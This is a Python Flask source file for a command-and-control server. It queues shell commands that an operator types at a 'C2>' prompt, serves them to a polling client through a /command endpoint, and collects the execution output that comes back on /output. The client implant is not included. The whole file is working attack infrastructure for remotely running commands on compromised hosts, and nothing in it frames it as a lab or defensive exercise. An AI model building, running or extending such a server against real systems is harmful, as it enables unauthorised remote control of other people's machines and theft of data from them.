from flask import Flask, request, jsonify
import threading
import queue
import time
import sys

# Create Flask application instance
app = Flask(__name__)

# Global variables for command and control
pending_command = {"cmd": None}  # Stores the current command to be sent to client
output_queue = queue.Queue()     # Thread-safe queue for storing received outputs
lock = threading.Lock()          # Lock for thread-safe access to shared resources

@app.route('/command', methods=['GET'])
def get_command():
    """
    Endpoint for client to poll for new commands.
    Client periodically calls this to check if there's a command to execute.
    """
    with lock:  # Ensure thread-safe access to pending_command
        if pending_command["cmd"]:
            cmd = pending_command["cmd"]
            pending_command["cmd"] = None  # Clear the command after retrieving
            sys.stdout.write(f"[*] Sending command to client: {cmd}\n")
            sys.stdout.flush()  # Ensure immediate output
            return jsonify({"command": cmd})
    # Return empty JSON if no command pending
    return jsonify({})

@app.route('/output', methods=['POST'])
def receive_output():
    """
    Endpoint for client to send back command execution results.
    Receives output from executed commands and displays it to the C2 operator.
    """
    try:
        # Parse JSON data from the request
        data = request.get_json()
        output = data.get('output', '')
        
        # Add output to the queue for processing
        output_queue.put(output)
        
        # Display the received output in a formatted way
        sys.stdout.write(f"\n{'='*60}\n")
        sys.stdout.write(f"[+] OUTPUT RECEIVED ({len(output)} bytes):\n")
        sys.stdout.write(f"{'='*60}\n")
        sys.stdout.write(output)
        if not output.endswith('\n'):
            sys.stdout.write('\n')  # Ensure newline if output doesn't have one
        sys.stdout.write(f"{'='*60}\n")
        sys.stdout.write("C2> ")  # Restore prompt
        sys.stdout.flush()  # Force output to display immediately
        
        return jsonify({"status": "ok"})
    except Exception as e:
        # Handle any errors in processing the output
        sys.stdout.write(f"[-] Error receiving output: {e}\n")
        sys.stdout.flush()
        return jsonify({"status": "error", "message": str(e)}), 400

def console_input():
    """
    Main console interface for the C2 operator.
    Handles user input and manages the command loop.
    """
    print("\n=== Command & Control Server ===")
    print("Commands:")
    print("  Type any shell command to send to client")
    print("  'history' - Display all received outputs")
    print("  'clear' - Clear output history")
    print("  'exit' or 'quit' - Shutdown client")
    print("================================\n")
    
    time.sleep(1)  # Brief pause for user to read the help
    
    all_outputs = []  # Store all received outputs for history
    
    while True:
        try:
            # Get command from C2 operator
            cmd = input("C2> ").strip()
            
            if cmd == "history":
                # Display all previously received outputs
                if not all_outputs:
                    print("[*] No outputs in history")
                else:
                    print(f"\n{'='*60}")
                    print(f"[*] OUTPUT HISTORY ({len(all_outputs)} commands)")
                    print(f"{'='*60}")
                    for i, output in enumerate(all_outputs, 1):
                        print(f"\n--- Output {i} ---")
                        print(output)
                    print(f"{'='*60}")
                    
            elif cmd == "clear":
                # Clear both the in-memory history and queue
                all_outputs.clear()
                while not output_queue.empty():
                    output_queue.get()  # Remove all items from queue
                print("[*] Output history cleared")
                
            elif cmd:
                # Regular command - queue it for the client
                with lock:
                    pending_command["cmd"] = cmd
                print(f"[*] Command queued: {cmd}")
                
                # Process any outputs that arrived while we were waiting
                while not output_queue.empty():
                    all_outputs.append(output_queue.get())
                    
        except EOFError:
            # Handle Ctrl+D (EOF)
            break
        except KeyboardInterrupt:
            # Handle Ctrl+C - don't exit, just show message
            print("\n[*] Ctrl+C detected. Use 'exit' command to stop client.")
            continue

if __name__ == '__main__':
    # Configure logging to reduce Flask's verbose output
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    
    # Start the console input thread
    input_thread = threading.Thread(target=console_input, daemon=True)
    input_thread.start()
    
    # Server startup messages
    print("[*] Starting server on 0.0.0.0:5000")
    print("[*] Waiting for input thread to initialize...")
    time.sleep(0.5)  # Brief pause to ensure input thread is ready
    
    # Start the Flask web server
    app.run(
        host='0.0.0.0',      # Listen on all network interfaces
        port=5000,           # Use port 5000
        debug=False,         # Disable debug mode for production
        threaded=True,       # Handle multiple requests concurrently
        use_reloader=False   # Disable reloader to avoid duplicate threads
    )